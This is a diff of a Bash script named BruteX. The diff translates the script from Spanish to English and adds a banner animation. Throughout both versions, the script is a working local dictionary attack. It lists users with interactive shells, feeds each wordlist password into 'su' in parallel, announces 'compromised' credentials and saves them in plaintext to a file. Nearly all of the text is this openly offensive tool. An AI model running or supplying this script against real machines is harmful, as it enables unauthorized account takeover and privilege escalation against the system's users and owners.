@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Configuración de colores y símbolos
+# Configuration - Colors and Symbols
 readonly RED="\033[1;31m"
 readonly GREEN="\033[1;32m"
 readonly YELLOW="\033[1;33m"
@@ -9,216 +9,232 @@ readonly CYAN="\033[1;36m"
 readonly PURPLE="\033[1;35m"
 readonly RESET="\033[0m"
 
-# Símbolos personalizados
+# Custom Symbols
 readonly BULLET="🔹"
 readonly USER_ICON="👤"
-readonly LOCK_ICON="🔓"
+readonly LOCK_ICON="🔒"
 readonly FOUND_ICON="✅"
 readonly WARNING_ICON="⚠️"
-readonly SEARCH_ICON="🔎"
+readonly SEARCH_ICON="🔍"
 readonly FAIL_ICON="❌"
 readonly PROGRESS_ICON="📊"
+readonly CLOCK_ICON="⏱️"
+readonly CRACKED_ICON="💥"
+readonly HAPPY_ICON="😎"
+readonly SAD_ICON="😞"
 
-# Variables globales
-declare -A credenciales_encontradas
-declare -a usuarios_interactivos
-DICCIONARIO=""
-PARAR=0
+# Global Variables
+declare -A compromised_credentials
+declare -a interactive_users
+DICTIONARY=""
+STOP=0
 trap ctrl_c INT
 
-function banner() {
+function animate_logo() {
+  local frames=(
+" ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗"
+" ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝"
+" ██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ "
+" ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ "
+" ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗"
+" ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"
+  )
+  
   clear
-  echo -e "${PURPLE}                                                                                ${RESET}"
-  echo -e "${PURPLE} ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗${RESET}"
-  echo -e "${PURPLE} ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝${RESET}"
-  echo -e "${PURPLE} ██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ ${RESET}"
-  echo -e "${PURPLE} ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ ${RESET}"
-  echo -e "${PURPLE} ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗${RESET}"
-  echo -e "${PURPLE} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝${RESET}"
-  echo -e "${YELLOW}                     BruteX - Ultimate Password Cracker${RESET}"
-  echo -e "${CYAN}                Herramienta avanzada de Ataque de Diccionario by MatthyGD${RESET}\n"
-    echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "${PURPLE}"
+  for i in {1..6}; do
+    echo "${frames[$i-1]}"
+    sleep 0.1
+  done
+  echo -e "${RESET}"
 }
 
-function mostrar_ayuda() {
-  echo -e "${BULLET} ${CYAN}Uso:${RESET} ${BLUE}$0 -d <diccionario>${RESET}"
-  echo -e "${BULLET} ${CYAN}Opciones:${RESET}"
-  echo -e "  ${BULLET} ${YELLOW}-d${RESET}   Especifica el archivo diccionario a usar"
-  echo -e "  ${BULLET} ${YELLOW}-h${RESET}   Muestra este mensaje de ayuda"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+function banner() {
+  animate_logo
+  echo -e "${YELLOW}                  BruteX - Advanced Password Cracking Tool${RESET}"
+  echo -e "${CYAN}             Professional Dictionary Attack Utility by MatthyGD${RESET}\n"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
 }
 
-function info() {
-  echo -e "${BULLET} ${CYAN}Diccionario:${RESET} ${BLUE}${DICCIONARIO}${RESET}"
-  echo -e "${BULLET} ${CYAN}Tamaño del diccionario:${RESET} ${BLUE}$(wc -l < "$DICCIONARIO") líneas${RESET}"
-  echo -e "${BULLET} ${CYAN}Usuarios detectados:${RESET} ${BLUE}${#usuarios_interactivos[@]}${RESET}"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+function show_help() {
+  echo -e "${BULLET} ${CYAN}Usage:${RESET} ${BLUE}$0 -w <wordlist>${RESET}"
+  echo -e "${BULLET} ${CYAN}Options:${RESET}"
+  echo -e "  ${BULLET} ${YELLOW}-w${RESET}   Specify wordlist file to use"
+  echo -e "  ${BULLET} ${YELLOW}-h${RESET}   Show this help message"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
+}
+
+function show_info() {
+  echo -e "${BULLET} ${CYAN}Wordlist:${RESET} ${BLUE}${DICTIONARY}${RESET}"
+  echo -e "${BULLET} ${CYAN}Wordlist size:${RESET} ${BLUE}$(wc -l < "$DICTIONARY") lines${RESET}"
+  echo -e "${BULLET} ${CYAN}Users detected:${RESET} ${BLUE}${#interactive_users[@]}${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
 }
 
 function ctrl_c() {
-  echo -e "\n${WARNING_ICON} ${RED}Interrupción recibida! Deteniendo inmediatamente...${RESET}"
-  PARAR=1
-  mostrar_resultados
+  echo -e "\n${WARNING_ICON} ${RED}Interrupt received! Stopping immediately...${RESET}"
+  STOP=1
+  show_results
   tput cnorm
   exit 1
 }
 
-function detectar_usuarios() {
-  echo -e "${SEARCH_ICON} ${CYAN}Detectando usuarios con shells interactivos...${RESET}"
+function detect_users() {
+  echo -e "${SEARCH_ICON} ${CYAN}Detecting users with interactive shells...${RESET}"
   
-  # Detección más robusta de usuarios
-  mapfile -t usuarios_interactivos < <(getent passwd | awk -F: '$7 ~ /(\/bash|\/sh|\/zsh)$/ {print $1}')
+  # Robust user detection
+  mapfile -t interactive_users < <(getent passwd | awk -F: '$7 ~ /(\/bash|\/sh|\/zsh)$/ {print $1}')
   
-  # Verificación adicional para sistemas con /etc/passwd diferente
-  if [ ${#usuarios_interactivos[@]} -eq 0 ]; then
-    echo -e "${WARNING_ICON} ${YELLOW}Primer método no encontró usuarios, intentando alternativa...${RESET}"
-    mapfile -t usuarios_interactivos < <(getent passwd | awk -F: '$3 >= 1000 && $3 <= 60000 {print $1}' | grep -v '^nobody$')
+  # Fallback detection method
+  if [ ${#interactive_users[@]} -eq 0 ]; then
+    echo -e "${WARNING_ICON} ${YELLOW}Primary method failed, trying alternative...${RESET}"
+    mapfile -t interactive_users < <(getent passwd | awk -F: '$3 >= 1000 && $3 <= 60000 {print $1}' | grep -v '^nobody$')
   fi
   
-  if [ ${#usuarios_interactivos[@]} -eq 0 ]; then
-    echo -e "${FAIL_ICON} ${RED}No se encontraron usuarios con shells interactivos${RESET}"
+  if [ ${#interactive_users[@]} -eq 0 ]; then
+    echo -e "${FAIL_ICON} ${RED}No users with interactive shells found${RESET}"
     exit 1
   fi
   
-  echo -e "\n${LOCK_ICON} ${GREEN}Usuarios detectados (${#usuarios_interactivos[@]}):${RESET}"
-  for usuario in "${usuarios_interactivos[@]}"; do
-    shell=$(getent passwd "$usuario" | cut -d: -f7)
-    home=$(getent passwd "$usuario" | cut -d: -f6)
-    echo -e "  ${BULLET} ${USER_ICON} ${CYAN}${usuario}${RESET}"
+  echo -e "\n${LOCK_ICON} ${GREEN}Detected users (${#interactive_users[@]}):${RESET}"
+  for user in "${interactive_users[@]}"; do
+    shell=$(getent passwd "$user" | cut -d: -f7)
+    home=$(getent passwd "$user" | cut -d: -f6)
+    echo -e "  ${BULLET} ${USER_ICON} ${CYAN}${user}${RESET}"
     echo -e "     ↳ ${YELLOW}Shell:${RESET} ${BLUE}${shell}${RESET}"
     echo -e "     ↳ ${YELLOW}Home:${RESET} ${BLUE}${home}${RESET}"
   done
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
 }
 
-function probar_credenciales() {
-  local diccionario=$1
-  local total_lineas=$(wc -l < "$diccionario")
-  local linea=0
-  local inicio=$(date +%s)
+function test_credentials() {
+  local wordlist=$1
+  local total_lines=$(wc -l < "$wordlist")
+  local line=0
+  local start_time=$(date +%s)
   local num_cores=$(nproc)
-  local hilos=$((num_cores * 2))  # Usamos el doble de núcleos disponibles para hilos
+  local threads=$((num_cores * 2))  # Use double the available cores
   
-  echo -e "\n${SEARCH_ICON} ${YELLOW}Iniciando el ataque con BruteX...${RESET}"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "\n${SEARCH_ICON} ${YELLOW}Launching BruteX attack...${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
   
-  # Función que se ejecutará en cada hilo
-  probar_en_hilo() {
-    local usuario=$1
-    local contrasena=$2
-    [ $PARAR -eq 1 ] && return
+  # Thread function
+  test_thread() {
+    local user=$1
+    local password=$2
+    [ $STOP -eq 1 ] && return
     
-    if echo "$contrasena" | timeout 0.1 su "$usuario" -c 'exit' 2>/dev/null; then
-      if [ -z "${credenciales_encontradas[$usuario]}" ]; then
-        credenciales_encontradas["$usuario"]="$contrasena"
-        echo -e "\n${FOUND_ICON} ${GREEN}¡Credencial comprometida!${RESET}"
-        echo -e "   ${CYAN}Usuario:${RESET} ${BLUE}${usuario}${RESET}"
-        echo -e "   ${CYAN}Contraseña:${RESET} ${GREEN}${contrasena}${RESET}"
-        echo -e "   ${CYAN}Hora:${RESET} ${BLUE}$(date)${RESET}"
+    if echo "$password" | timeout 0.1 su "$user" -c 'exit' 2>/dev/null; then
+      if [ -z "${compromised_credentials[$user]}" ]; then
+        compromised_credentials["$user"]="$password"
+        echo -e "\n${FOUND_ICON} ${GREEN}Credentials compromised!${RESET}"
+        echo -e "   ${CYAN}User:${RESET} ${BLUE}${user}${RESET}"
+        echo -e "   ${CYAN}Password:${RESET} ${GREEN}${password}${RESET}"
+        echo -e "   ${CYAN}Time:${RESET} ${BLUE}$(date)${RESET}"
         
-        # Si encontramos todas las credenciales, salir
-        if [ ${#credenciales_encontradas[@]} -eq ${#usuarios_interactivos[@]} ]; then
-          PARAR=1
+        # Exit if all credentials found
+        if [ ${#compromised_credentials[@]} -eq ${#interactive_users[@]} ]; then
+          STOP=1
         fi
       fi
     fi
   }
   
-  # Exportar funciones y variables necesarias
-  export -f probar_en_hilo
-  export PARAR
-  export credenciales_encontradas
+  # Export required functions and variables
+  export -f test_thread
+  export STOP
+  export compromised_credentials
   
-  while IFS= read -r contrasena && [ $PARAR -eq 0 ]; do
-    linea=$((linea + 1))
-    porcentaje=$((linea * 100 / total_lineas))
+  while IFS= read -r password && [ $STOP -eq 0 ]; do
+    line=$((line + 1))
+    percentage=$((line * 100 / total_lines))
     
-    # Mostrar progreso con información detallada
-    tiempo_transcurrido=$(( $(date +%s) - inicio ))
-    tiempo_estimado=$(( tiempo_transcurrido * (total_lineas - linea) / linea )) 2>/dev/null
-    tiempo_formato=$(printf "%02d:%02d:%02d" $((tiempo_estimado/3600)) $((tiempo_estimado%3600/60)) $((tiempo_estimado%60)))
+    # Show detailed progress
+    elapsed_time=$(( $(date +%s) - start_time ))
+    estimated_time=$(( elapsed_time * (total_lines - line) / line )) 2>/dev/null
+    eta_formatted=$(printf "%02d:%02d:%02d" $((estimated_time/3600)) $((estimated_time%3600/60)) $((estimated_time%60)))
     
-    echo -ne "\r${PROGRESS_ICON} ${CYAN}Progreso:${RESET} ${BLUE}${porcentaje}%${RESET} | ${CYAN}Línea:${RESET} ${BLUE}${linea}/${total_lineas}${RESET} | ${CYAN}ETA:${RESET} ${BLUE}${tiempo_formato}${RESET} | ${CYAN}Probando:${RESET} ${YELLOW}${contrasena}${RESET}"
+    echo -ne "\r${PROGRESS_ICON} ${CYAN}Progress:${RESET} ${BLUE}${percentage}%${RESET} | ${CYAN}Line:${RESET} ${BLUE}${line}/${total_lines}${RESET} | ${CYAN}ETA:${RESET} ${BLUE}${eta_formatted}${RESET} | ${CYAN}Testing:${RESET} ${YELLOW}${password}${RESET}"
     
-    # Usar xargs para procesar en paralelo
-    printf "%s\n" "${usuarios_interactivos[@]}" | xargs -P $hilos -I {} bash -c 'probar_en_hilo "{}" "'"$contrasena"'"'
+    # Parallel processing with xargs
+    printf "%s\n" "${interactive_users[@]}" | xargs -P $threads -I {} bash -c 'test_thread "{}" "'"$password"'"'
     
-  done < "$diccionario"
+  done < "$wordlist"
   
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
 }
 
-function mostrar_resultados() {
-  echo -e "\n${LOCK_ICON} ${YELLOW}🔓 RESUMEN FINAL DEL ATAQUE 🔓${RESET}"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+function show_results() {
+  echo -e "\n${LOCK_ICON} ${YELLOW}🔓 FINAL ATTACK SUMMARY 🔓${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
   
-  if [ ${#credenciales_encontradas[@]} -gt 0 ]; then
-    echo -e "${CRACKED_ICON} ${GREEN}¡ATAQUE EXITOSO!${RESET} ${HAPPY_ICON}"
-    echo -e "${CYAN}Credenciales comprometidas encontradas:${RESET} ${GREEN}${#credenciales_encontradas[@]}${RESET}"
+  if [ ${#compromised_credentials[@]} -gt 0 ]; then
+    echo -e "${CRACKED_ICON} ${GREEN}ATTACK SUCCESSFUL!${RESET} ${HAPPY_ICON}"
+    echo -e "${CYAN}Compromised credentials found:${RESET} ${GREEN}${#compromised_credentials[@]}${RESET}"
     
-    # Crear archivo con las credenciales encontradas
-    local archivo_resultados="credenciales_comprometidas_$(date +%Y%m%d_%H%M%S).txt"
+    # Create results file
+    local results_file="compromised_credentials_$(date +%Y%m%d_%H%M%S).txt"
     {
       echo "╔════════════════════════════════════════╗"
-      echo "║    CREDENCIALES COMPROMETIDAS - $(date +"%Y-%m-%d %H:%M:%S") ║"
+      echo "║    COMPROMISED CREDENTIALS - $(date +"%Y-%m-%d %H:%M:%S") ║"
       echo "╠════════════════════════════════════════╣"
-      for usuario in "${!credenciales_encontradas[@]}"; do
-        echo "║  Usuario: ${usuario}"
-        echo "║  Contraseña: ${credenciales_encontradas[$usuario]}"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+      for user in "${!compromised_credentials[@]}"; do
+        echo "║  User: ${user}"
+        echo "║  Password: ${compromised_credentials[$user]}"
+        echo "╠════════════════════════════════════════╣"
       done
       echo "╚════════════════════════════════════════╝"
-    } > "$archivo_resultados"
+    } > "$results_file"
     
-    echo -e "\n${BULLET} ${CYAN}Las credenciales se han guardado en:${RESET} ${BLUE}${archivo_resultados}${RESET}"
+    echo -e "\n${BULLET} ${CYAN}Credentials saved to:${RESET} ${BLUE}${results_file}${RESET}"
     
-    # Mostrar resumen en pantalla
-    for usuario in "${!credenciales_encontradas[@]}"; do
-      echo -e "  ${FOUND_ICON} ${CYAN}Usuario:${RESET} ${BLUE}${usuario}${RESET}"
-      echo -e "     ${BULLET} ${GREEN}Contraseña:${RESET} ${YELLOW}${credenciales_encontradas[$usuario]}${RESET}"
+    # Display summary
+    for user in "${!compromised_credentials[@]}"; do
+      echo -e "  ${FOUND_ICON} ${CYAN}User:${RESET} ${BLUE}${user}${RESET}"
+      echo -e "     ${BULLET} ${GREEN}Password:${RESET} ${YELLOW}${compromised_credentials[$user]}${RESET}"
     done
   else
-    echo -e "${SAD_ICON} ${YELLOW}El ataque no encontró credenciales válidas${RESET} ${SAD_ICON}"
-    echo -e "${BULLET} ${CYAN}Se probaron ${BLUE}${linea}${CYAN} contraseñas de ${BLUE}${total_lineas}${CYAN} en el diccionario${RESET}"
-    echo -e "${BULLET} ${CYAN}Usuarios probados:${RESET} ${BLUE}${#usuarios_interactivos[@]}${RESET}"
+    echo -e "${SAD_ICON} ${YELLOW}No valid credentials found${RESET} ${SAD_ICON}"
+    echo -e "${BULLET} ${CYAN}Tested ${BLUE}${line}${CYAN} passwords from ${BLUE}${total_lines}${CYAN} in wordlist${RESET}"
+    echo -e "${BULLET} ${CYAN}Users tested:${RESET} ${BLUE}${#interactive_users[@]}${RESET}"
   fi
   
-  local restantes=$(( ${#usuarios_interactivos[@]} - ${#credenciales_encontradas[@]} ))
-  if [ $restantes -gt 0 ] && [ $PARAR -eq 0 ]; then
-    echo -e "\n${WARNING_ICON} ${YELLOW}${restantes} usuarios resistieron el ataque${RESET}"
-  elif [ $restantes -gt 0 ]; then
-    echo -e "\n${WARNING_ICON} ${YELLOW}Ataque interrumpido - ${restantes} usuarios no fueron probados completamente${RESET}"
+  local remaining=$(( ${#interactive_users[@]} - ${#compromised_credentials[@]} ))
+  if [ $remaining -gt 0 ] && [ $STOP -eq 0 ]; then
+    echo -e "\n${WARNING_ICON} ${YELLOW}${remaining} users resisted the attack${RESET}"
+  elif [ $remaining -gt 0 ]; then
+    echo -e "\n${WARNING_ICON} ${YELLOW}Attack interrupted - ${remaining} users not fully tested${RESET}"
   fi
   
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
-  echo -e "${CLOCK_ICON} ${CYAN}Tiempo total de ejecución:${RESET} ${BLUE}$(date -u -d @$(($(date +%s)-inicio)) +'%H:%M:%S')${RESET}"
-  echo -e "${PURPLE}──────────────────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
+  echo -e "${CLOCK_ICON} ${CYAN}Total execution time:${RESET} ${BLUE}$(date -u -d @$(($(date +%s)-start_time)) +'%H:%M:%S')${RESET}"
+  echo -e "${PURPLE}────────────────────────────────────────────────────────────────────────────────${RESET}"
 }
 
-# Main
-while getopts ":d:h" opt; do
+# Main Execution
+while getopts ":w:h" opt; do
   case $opt in
-    d) DICCIONARIO="$OPTARG" ;;
-    h) banner; mostrar_ayuda; exit 0 ;;
-    *) echo -e "${FAIL_ICON} ${RED}Opción inválida: -$OPTARG${RESET}"; mostrar_ayuda; exit 1 ;;
+    w) DICTIONARY="$OPTARG" ;;
+    h) banner; show_help; exit 0 ;;
+    *) echo -e "${FAIL_ICON} ${RED}Invalid option: -$OPTARG${RESET}"; show_help; exit 1 ;;
   esac
 done
 
-if [ -z "$DICCIONARIO" ]; then
+if [ -z "$DICTIONARY" ]; then
   banner
-  mostrar_ayuda
+  show_help
   exit 0
 fi
 
-if [ ! -f "$DICCIONARIO" ]; then
-  echo -e "${FAIL_ICON} ${RED}El archivo diccionario no existe${RESET}"
+if [ ! -f "$DICTIONARY" ]; then
+  echo -e "${FAIL_ICON} ${RED}Wordlist file not found${RESET}"
   exit 1
 fi
 
 banner
-detectar_usuarios
-info
-probar_credenciales "$DICCIONARIO"
-mostrar_resultados
+detect_users
+show_info
+test_credentials "$DICTIONARY"
+show_results
 
 tput cnorm
